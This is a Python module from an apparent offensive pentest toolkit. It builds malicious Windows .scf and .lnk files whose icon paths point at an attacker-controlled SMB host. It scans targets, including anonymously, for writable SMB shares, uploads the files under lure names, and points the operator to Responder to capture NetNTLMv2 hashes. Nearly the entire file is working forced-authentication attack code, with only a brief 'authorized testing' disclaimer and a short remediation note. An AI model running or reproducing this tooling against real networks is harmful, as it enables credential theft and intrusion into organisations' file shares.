"""
Expedite Strike — Malicious LNK / SCF File Generator
======================================================
For authorized penetration testing only.
Generates Windows Shell Command Files (.scf) and LNK shortcuts
that force NTLM authentication to attacker's IP when browsed.
Deploys to world-writable SMB shares for hash harvesting.

MITRE ATT&CK:
  T1187 — Forced Authentication
  T1039 — Data from Network Shared Drive
"""

import os
import socket
import struct
import tempfile
import time
from typing import Callable, Dict, List, Optional


_log_fn: Optional[Callable] = None
OUTPUT_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
    "scan_cache", "lnk_files"
)

MITRE = [
    {"id": "T1187", "name": "Forced Authentication"},
    {"id": "T1039", "name": "Data from Network Shared Drive"},
    {"id": "T1550.002", "name": "Pass the Hash (follow-on)"},
]


def _log(msg: str):
    if _log_fn:
        _log_fn(msg)
    else:
        print(msg)


def _ensure_output_dir():
    os.makedirs(OUTPUT_DIR, exist_ok=True)


# ── SCF File Generator ─────────────────────────────────────────────────────────

def generate_scf_file(
    attacker_ip: str,
    output_path: str = "",
    filename: str = "@capture.scf",
    log_fn: Callable = None,
) -> str:
    """
    Generate a Windows Shell Command File (.scf) that forces NTLM auth.

    When a user opens File Explorer in the share containing this file,
    Windows automatically loads the icon path \\\\attacker_ip\\share
    triggering NTLM authentication.

    Args:
        attacker_ip:  Attacker IP to receive NTLM hash
        output_path:  Directory to save file (default: scan_cache/lnk_files)
        filename:     Filename (@ prefix makes it appear first in Explorer)
        log_fn:       Logging callback

    Returns:
        Path to generated file
    """
    global _log_fn
    _log_fn = log_fn
    _ensure_output_dir()

    if not output_path:
        output_path = OUTPUT_DIR

    filepath = os.path.join(output_path, filename)

    scf_content = (
        "[Shell]\r\n"
        "Command=2\r\n"
        f"IconFile=\\\\{attacker_ip}\\share\\icon.ico\r\n"
        "[Taskbar]\r\n"
        "Command=ToggleDesktop\r\n"
    )

    with open(filepath, "w", newline="\r\n") as f:
        f.write(scf_content)

    _log(f"  [LNK] ✅ SCF file generated: {filepath}")
    _log(f"  [LNK] Icon path: \\\\{attacker_ip}\\share\\icon.ico")
    _log(f"  [LNK] When user browses share → Windows sends NetNTLMv2 to {attacker_ip}")
    return filepath


# ── LNK File Generator ─────────────────────────────────────────────────────────

def _build_lnk_bytes(attacker_ip: str, target_path: str = "") -> bytes:
    """
    Build a minimal Windows LNK file in pure Python.
    Sets IconLocation to UNC path pointing to attacker IP.
    """
    # LNK Shell Link header
    HEADER_SIZE    = 0x4C
    LINK_CLSID     = bytes.fromhex("0114020000000000C000000000000046")
    # LinkFlags: HasLinkTargetIDList | HasLinkInfo | HasRelativePath | IsUnicode
    LINK_FLAGS     = struct.pack("<I", 0x0001009B)
    # FileAttributes: FILE_ATTRIBUTE_NORMAL
    FILE_ATTRS     = struct.pack("<I", 0x00000020)
    ZERO_TIME      = b"\x00" * 8
    FILE_SIZE      = struct.pack("<I", 0)
    ICON_INDEX     = struct.pack("<I", 0)
    SHOW_CMD       = struct.pack("<I", 1)   # SW_NORMAL
    HOT_KEY        = struct.pack("<H", 0)
    RESERVED       = b"\x00" * 10

    header = (
        struct.pack("<I", HEADER_SIZE)
        + LINK_CLSID
        + LINK_FLAGS
        + FILE_ATTRS
        + ZERO_TIME   # creation time
        + ZERO_TIME   # access time
        + ZERO_TIME   # write time
        + FILE_SIZE
        + ICON_INDEX
        + SHOW_CMD
        + HOT_KEY
        + RESERVED
    )

    # IDList (minimal — just root and empty)
    id_list = b"\x00\x00"  # empty IDList
    id_list_section = struct.pack("<H", len(id_list)) + id_list

    # LinkInfo (minimal, empty — no local path)
    link_info_size  = 0x1C
    link_info = (
        struct.pack("<I", link_info_size)
        + struct.pack("<I", link_info_size)  # header size
        + struct.pack("<I", 0x00000000)       # flags (no volume, no local path)
        + struct.pack("<I", 0) * 4            # offsets = 0
    )

    # StringData — RelativePath + IconLocation as UNC
    unc_path = f"\\\\{attacker_ip}\\share\\icon.ico"

    def _str_data(s: str) -> bytes:
        encoded = s.encode("utf-16-le")
        return struct.pack("<H", len(s)) + encoded

    # StringData sections (order per MS-SHLLINK spec):
    # NAME, RELATIVEPATH, WORKDIR, ARGS, ICON_LOCATION
    name_str     = ""
    rel_path_str = "."
    work_dir_str = ""
    args_str     = ""
    icon_str     = unc_path

    string_data = (
        _str_data(name_str)
        + _str_data(rel_path_str)
        + _str_data(work_dir_str)
        + _str_data(args_str)
        + _str_data(icon_str)
    )

    return header + id_list_section + link_info + string_data


def generate_lnk_file(
    attacker_ip: str,
    output_path: str = "",
    filename: str = "Invoice.lnk",
    log_fn: Callable = None,
) -> str:
    """
    Generate a malicious Windows LNK shortcut in pure Python.

    Sets IconLocation to \\\\attacker_ip\\share\\icon.ico which forces
    NTLM authentication when the file is viewed in Explorer.

    Args:
        attacker_ip:  Attacker IP to receive NTLM hash
        output_path:  Directory to save (default: scan_cache/lnk_files)
        filename:     Shortcut filename
        log_fn:       Logging callback

    Returns:
        Path to generated .lnk file
    """
    global _log_fn
    _log_fn = log_fn
    _ensure_output_dir()

    if not output_path:
        output_path = OUTPUT_DIR

    if not filename.endswith(".lnk"):
        filename += ".lnk"

    filepath = os.path.join(output_path, filename)

    lnk_bytes = _build_lnk_bytes(attacker_ip)
    with open(filepath, "wb") as f:
        f.write(lnk_bytes)

    _log(f"  [LNK] ✅ LNK file generated: {filepath}")
    _log(f"  [LNK] Icon UNC: \\\\{attacker_ip}\\share\\icon.ico")
    return filepath


# ── SMB Share Discovery & Deployment ──────────────────────────────────────────

def find_writable_shares(
    target: str,
    username: str = "",
    password: str = "",
    domain: str = "",
    log_fn: Callable = None,
) -> List[Dict]:
    """
    Enumerate SMB shares on target and test for write access.

    Args:
        target:    Target IP
        username:  SMB username (empty = anonymous)
        password:  SMB password
        domain:    AD domain
        log_fn:    Logging callback

    Returns:
        List of {target, share, writable} dicts
    """
    global _log_fn
    _log_fn = log_fn
    writable = []

    _log(f"  [LNK] Enumerating shares on {target}...")

    try:
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(target, target, timeout=10)

        try:
            if username:
                conn.login(username, password, domain)
            else:
                conn.login("", "")  # anonymous
        except Exception as auth_err:
            _log(f"  [LNK] Auth failed on {target}: {auth_err}")
            return writable

        shares = conn.listShares()
        for share in shares:
            share_name = share["shi1_netname"].rstrip("\x00")
            if share_name in ("IPC$", "NETLOGON", "SYSVOL"):
                continue
            try:
                # Test write by creating a temp file
                test_file = f"xstrike_write_test_{int(time.time())}.tmp"
                conn.putFile(share_name, "\\" + test_file, lambda x: b"test")
                conn.deleteFile(share_name, "\\" + test_file)
                writable.append({
                    "target": target,
                    "share":  share_name,
                    "path":   f"\\\\{target}\\{share_name}",
                    "writable": True,
                })
                _log(f"  [LNK] ✅ Writable share: \\\\{target}\\{share_name}")
            except Exception:
                pass  # not writable

        conn.close()

    except ImportError:
        _log("  [LNK] impacket not installed — cannot enumerate shares")
    except Exception as e:
        _log(f"  [LNK] Share enum error on {target}: {e}")

    return writable


def deploy_to_smb_shares(
    targets: List[str],
    attacker_ip: str,
    username: str = "",
    password: str = "",
    domain: str = "",
    log_fn: Callable = None,
) -> Dict:
    """
    Find writable SMB shares and deploy SCF + LNK files.

    Args:
        targets:      List of target IPs
        attacker_ip:  Attacker IP for UNC path
        username:     SMB credentials
        password:     SMB password
        domain:       AD domain
        log_fn:       Logging callback

    Returns:
        {shares_written, files_dropped, findings}
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"\n  [LNK] Deploying forced-auth files to {len(targets)} target(s)...")

    shares_written = []
    files_dropped  = []
    findings       = []

    # Generate files locally first
    scf_path = generate_scf_file(attacker_ip, log_fn=log_fn)
    lnk_path = generate_lnk_file(attacker_ip, log_fn=log_fn)

    for target in targets:
        writable = find_writable_shares(target, username, password, domain, log_fn)
        for share_info in writable:
            share_name = share_info["share"]
            try:
                from impacket.smbconnection import SMBConnection
                conn = SMBConnection(target, target, timeout=10)
                if username:
                    conn.login(username, password, domain)
                else:
                    conn.login("", "")

                # Upload SCF file
                scf_name = "@capture.scf"
                with open(scf_path, "rb") as f:
                    conn.putFile(share_name, "\\" + scf_name, f.read)
                files_dropped.append(f"\\\\{target}\\{share_name}\\{scf_name}")
                _log(f"  [LNK] ✅ SCF deployed to \\\\{target}\\{share_name}\\{scf_name}")

                # Upload LNK file
                lnk_name = "Important_Report.lnk"
                with open(lnk_path, "rb") as f:
                    conn.putFile(share_name, "\\" + lnk_name, f.read)
                files_dropped.append(f"\\\\{target}\\{share_name}\\{lnk_name}")
                _log(f"  [LNK] ✅ LNK deployed to \\\\{target}\\{share_name}\\{lnk_name}")

                shares_written.append(share_info)
                conn.close()

            except Exception as e:
                _log(f"  [LNK] Deploy failed to \\\\{target}\\{share_name}: {e}")

    if files_dropped:
        findings.append({
            "title":       f"Forced Auth Files Deployed — {len(files_dropped)} File(s)",
            "severity":    "Critical",
            "description": (
                f"Malicious SCF and LNK files deployed to {len(shares_written)} share(s): "
                f"{', '.join(s['path'] for s in shares_written)}. "
                f"When any user browses these shares, Windows will automatically "
                f"send NetNTLMv2 hashes to {attacker_ip}. "
                f"Combine with LLMNR poisoner to capture and relay hashes."
            ),
            "target":      ", ".join(set(t for t in targets)),
            "mitre_id":    "T1187",
            "mitre_name":  "Forced Authentication",
            "remediation": (
                "Restrict write access to shared folders (principle of least privilege). "
                "Block outbound SMB (TCP 445) at network perimeter. "
                "Enforce 'Restrict NTLM: Outgoing NTLM traffic to remote servers' via GPO."
            ),
        })

    return {
        "shares_written": shares_written,
        "files_dropped":  files_dropped,
        "findings":       findings,
        "summary":        f"Deployed {len(files_dropped)} files to {len(shares_written)} shares",
    }


# ── Top-Level API ──────────────────────────────────────────────────────────────

def run_lnk_hash_harvest(
    targets: List[str],
    attacker_ip: str = "",
    credential: Dict = None,
    log_fn: Callable = None,
    duration: int = 120,
) -> Dict:
    """
    Full LNK hash harvest chain:
    1. Generate SCF + LNK files
    2. Find writable shares on targets
    3. Deploy files
    4. Wait for connections (user must browse the share)

    Args:
        targets:     Target IPs
        attacker_ip: Our IP (auto-detected if empty)
        credential:  {'username': ..., 'password': ..., 'domain': ...}
        log_fn:      Logging callback
        duration:    Seconds to wait for connections after deployment

    Returns:
        {files_deployed, targets_hit, findings, mitre}
    """
    global _log_fn
    _log_fn = log_fn

    if not attacker_ip:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            attacker_ip = s.getsockname()[0]
            s.close()
        except Exception:
            attacker_ip = "127.0.0.1"

    cred = credential or {}

    _log(f"\n{'='*60}")
    _log(f"  [LNK] Malicious LNK/SCF Hash Harvest")
    _log(f"  [LNK] Attacker IP : {attacker_ip}")
    _log(f"  [LNK] Targets     : {targets}")
    _log(f"  [LNK] Duration    : {duration}s wait after deployment")
    _log(f"{'='*60}\n")

    result = deploy_to_smb_shares(
        targets, attacker_ip,
        username=cred.get("username", ""),
        password=cred.get("password", ""),
        domain=cred.get("domain", ""),
        log_fn=log_fn,
    )

    if result["files_dropped"]:
        _log(f"\n  [LNK] ⏳ Waiting {duration}s for users to browse shares...")
        _log(f"  [LNK] Run LLMNR poisoner or Responder to capture incoming hashes")
        _log(f"  [LNK] Watch: sudo responder -I eth0 -wPv")
        time.sleep(min(duration, 30))  # Brief wait — actual capture is via LLMNR/Responder
    else:
        _log("  [LNK] No writable shares found — files not deployed")
        _log("  [LNK] Tip: Try with valid domain credentials to access more shares")

    return {
        "files_deployed": len(result["files_dropped"]),
        "targets_hit":    [s["target"] for s in result["shares_written"]],
        "shares_written": result["shares_written"],
        "files_dropped":  result["files_dropped"],
        "findings":       result["findings"],
        "mitre":          MITRE,
        "attacker_ip":    attacker_ip,
        "summary":        result["summary"],
    }
